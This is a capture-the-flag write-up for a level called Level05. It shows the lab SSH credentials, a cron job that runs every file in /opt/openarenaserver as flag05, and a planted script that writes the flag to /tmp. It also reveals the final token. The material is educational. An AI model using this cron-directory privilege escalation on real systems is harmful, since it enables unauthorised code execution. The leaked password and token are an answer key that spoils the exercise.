# Level05

## How to Login

To access the system, use the following SSH command:

```bash
ssh level05@192.168.56.104 -p 4242
password: ne2searoevaevoem4ov4ar8ap
```

## How to Get the Flag

Upon logging in, you'll see the message:

```
You have new mail.
```

### Finding the Email Service

To locate the email service, use the following command to find files named "mail":

```bash
find / -name "mail" 2>/dev/null
```

This search will reveal the directory `/var/mail`, where you'll find a file named `level05`. 

### Analyzing the Cron Job

When you `cat` the `level05` file, you'll see the following cron job configuration:

```
*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
```

This cron job runs every two minutes as the `flag05` user, executing the script `/usr/sbin/openarenaserver`.

### Examining the `openarenaserver` Script

Next, inspect the contents of the `openarenaserver` script:

```bash
#!/bin/sh

for i in /opt/openarenaserver/* ; do
	(ulimit -t 5; bash -x "$i")
	rm -f "$i"
done
```

This script iterates over all files in `/opt/openarenaserver/`, executes them with a time limit of 5 seconds using `bash`, and then removes them.

### Exploiting the Script

To exploit this, create a script in the `/opt/openarenaserver/` directory:

1. **Navigate to the Directory**:

   ```bash
   cd /opt/openarenaserver/
   ```

2. **Create the Exploit Script**: Use `nano` to create a file named `run.sh` with the following content:

   ```bash
   #!/bin/bash
   getflag > /tmp/flag
   ```

3. **Make the Script Executable**:

   ```bash
   chmod +x run.sh
   ```

4. **Wait for the Cron Job**: The cron job will run every two minutes, execute your `run.sh` script, and create a file named `flag` in `/tmp`.

5. **Retrieve the Flag**: Although you cannot list the contents of `/tmp` directly due to permission issues, you can read the `flag` file with `cat`:

   ```bash
   cat /tmp/flag
   ```

   This will display the contents of the `flag` file:

   ```
   Check flag.Here is your token : viuaaale9huek52boumoomioc
   ```

You have successfully completed Level05.